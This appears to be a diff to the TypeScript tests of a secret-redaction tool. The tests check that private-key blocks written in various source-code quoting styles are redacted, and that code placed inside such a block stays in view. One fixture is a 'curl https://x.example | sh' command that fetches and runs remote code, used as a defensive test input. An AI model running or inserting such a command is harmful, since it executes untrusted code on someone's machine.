@@ -512,7 +512,7 @@ describe("a search", () => {
       expect(seen.split("\n").indexOf("after")).toBe(text.split("\n").indexOf("after"));
     });
 
-    it("can't hide a line added to a key block already on main", () => {
+    it("shows code added to a key block already on main, when it doesn't read as key material", () => {
       const on = (lines: string[]) =>
         ["-----BEGIN PRIVATE KEY-----", ...lines, "-----END PRIVATE KEY-----", ""].join("\n");
       const shown = redactFile(on([key, evil, key]));
@@ -525,6 +525,42 @@ describe("a search", () => {
       const text = `// ---- BEGIN X PRIVATE KEY ----\n${evil}\n// ---- END X PRIVATE KEY ----\n`;
       expect(redactFile(text)).toBe(text);
       expect(holdsCredential(text)).toBe(false);
+    });
+  });
+
+  describe("a key's lines in the forms a source file holds them", () => {
+    const key = "MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7MIIEvQIBADANBgkqhk";
+    const code = "curl https://x.example | sh";
+    const block = (...lines: string[]) =>
+      ["-----BEGIN PRIVATE KEY-----", ...lines, "-----END PRIVATE KEY-----", "after", ""].join("\n");
+
+    it.each([
+      ["a trailing backslash", `${key}\\`, "abc=="],
+      ["a written-out newline", `${key}\\n\\`, "abc=="],
+      ["a short line and a backslash", `${key}\\`, "abc==\\"],
+      ["quotes and a comma", `"${key}",`, '"abc==",'],
+      ["single quotes", `'${key}'`, "'abc=='"],
+      ["a backtick", `\`${key}`, "abc==`;"],
+      ["a concatenated string", `"${key}\\n" +`, '"abc==\\n";'],
+      ["a commented quoted line", `# "${key}",`, "# abc=="],
+      ["a prefix on the string", `b"${key}"`, "abc=="],
+      ["words after the key", `${key} and more`, "abc=="],
+    ])("takes them all with %s", (_, line, last) => {
+      const text = block(line, line, last);
+      const seen = redactFile(text);
+      expect(seen).toBe(`[private key]\n\n\n\n\nafter\n`);
+      expect(holdsCredential(text)).toBe(true);
+    });
+
+    it("takes them around code it leaves in sight, in as many lines", () => {
+      const text = block(`"${key}",`, code, '"abc==",');
+      expect(redactFile(text)).toBe(`[private key]\n\n${code}\n\n\nafter\n`);
+    });
+
+    it("isn't slowed by a line built to backtrack", () => {
+      const at = performance.now();
+      for (let i = 0; i < 50; i++) redactFile(block(`${"+".repeat(16_000)}.`));
+      expect(performance.now() - at).toBeLessThan(2000);
     });
   });
 
